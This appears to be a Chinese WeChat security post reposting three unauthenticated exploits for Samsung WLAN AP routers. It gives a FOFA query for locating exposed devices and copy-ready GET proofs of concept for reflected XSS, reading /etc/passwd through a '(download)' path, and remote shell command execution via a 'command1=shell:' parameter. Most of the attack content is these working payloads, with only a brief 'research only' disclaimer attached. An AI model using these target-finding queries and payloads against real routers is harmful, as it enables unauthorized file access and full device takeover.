> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/GfXw4MgXwPDzslqYIZijtQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/ldFaBNSkvHjdIlmWrpGeTwTIBfKLnVwODb2rcD60OH0GrDfgS1grU4azvLhLyGmQwA4CUGprEVo2TUk2yMZvDA/640?wx_fmt=gif)

无聊来吃个瓜，网传三星路由器漏洞，据说是 0DAY，可是这个漏洞在去年就被曝光了。也不知道流传炒作的 0DAY 是不是这个漏洞，最后附带原文链接

FOFA 搜索语法：title=="Samsung WLAN AP"

![](https://mmbiz.qpic.cn/mmbiz_gif/FIBZec7ucCgp5qKoq2LZ7qzM4YkjoMocD51tfJ3nutnEwSyO7oo2nTuicuvI0lAuGkSbwDhctEnibgUteCYcQQgQ/640?wx_fmt=gif)

Vulnerability#1

1

漏洞类型:

XSS

2

漏洞利用条件:

无

3

漏洞详情:

1. 直接访问目标即可

```
https://xxx.xxx.xxx.xxx/%3Cscript%3Ealert(1)%3C/script%3E
```

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/PDdTPicsmh4hamLYz6adgYVP1D0lFrKibMtqPEmnCXt4uk0Bv4Rd9xjc7ZInypdpZAbGCrmvzL43gCqVwTk5GUGg/640?wx_fmt=jpeg)

  

  

4

漏洞 POC:

```
GET https://xxx.xxx.xxx/<script>alert(1)</script>
```

![](https://mmbiz.qpic.cn/mmbiz_gif/FIBZec7ucCgp5qKoq2LZ7qzM4YkjoMocD51tfJ3nutnEwSyO7oo2nTuicuvI0lAuGkSbwDhctEnibgUteCYcQQgQ/640?wx_fmt=gif)

Vulnerability#2

1

漏洞类型:

本地文件包含

2

漏洞利用条件:

无

3

漏洞详情:

1. 直接访问目标即可  

```
https://xxx.xxx.xxx.xxx/ (download)/etc/passwd
```

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/PDdTPicsmh4hamLYz6adgYVP1D0lFrKibMc3C8f4hCbo2IA6FvPvvWJrWp8WiabZ5GfTo8LlxQSxPdsFoaW2omSgw/640?wx_fmt=jpeg)

  

  

4

漏洞 POC:

```
GET https://xxx.xxx.xxx.xxx/ (download)/etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_gif/FIBZec7ucCgp5qKoq2LZ7qzM4YkjoMocD51tfJ3nutnEwSyO7oo2nTuicuvI0lAuGkSbwDhctEnibgUteCYcQQgQ/640?wx_fmt=gif)

Vulnerability#3

1

漏洞类型:

远程命令执行

2

漏洞利用条件:

无

3

漏洞详情:

1. 直接访问目标即可

```
https://xxx.xxx.xxx.xxx/(download)/tmp/a.txt?command1=shell:ls%20-la%20|%20dd%20of=/tmp/a.txt
```

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/PDdTPicsmh4hamLYz6adgYVP1D0lFrKibMAoJkv2fxaibBx8OWuwg0w21Bf0lfa8EfSlriahVtYGrZ03Fich7Iua1Sw/640?wx_fmt=jpeg)

  

  

4

漏洞 POC:

```
GET https://xxx.xxx.xxx.xxx/(download)/tmp/a.txt?command1=shell:ls%20-la%20|%20dd%20of=/tmp/a.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/JGvzrR1zc4TE1OMlzTiau6mjXv62SiaK7dkWsS6HCshficjNbyAiclEcMfcGV4E7kSicQ7icEiawJYvXXbMyNKjKLwPjQ/640?wx_fmt=png)

END

**注：此文章只用于漏洞研究，切勿用于违法用途。因滥用产生的一切后果与本公众号无关。**

**参考文章:**

**https://iryl.info/2020/11/27/exploiting-samsung-router-wlan-ap-wea453e/**

扫码关注更多精彩

![](https://mmbiz.qpic.cn/mmbiz_png/PDdTPicsmh4iaxUx2M4LXBJhBNfzLmtxg1mCib9dkVB5y1C6qmicKolbLfGWxEicYWjP6VSUx296cUWj3dBrqtDfb6g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/PDdTPicsmh4iaxUx2M4LXBJhBNfzLmtxg1ibz8zRr774rnu7TERPQHpcV0icbu9fCs0mRjWZuicS2kmLXFHkCKYicpUA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/PDdTPicsmh4iaxUx2M4LXBJhBNfzLmtxg1gibj2XWCGAOvCNqttdEicsvUCVPj3NXzZuaXyXqSIVSTeGwKuGzhfLmw/640?wx_fmt=png)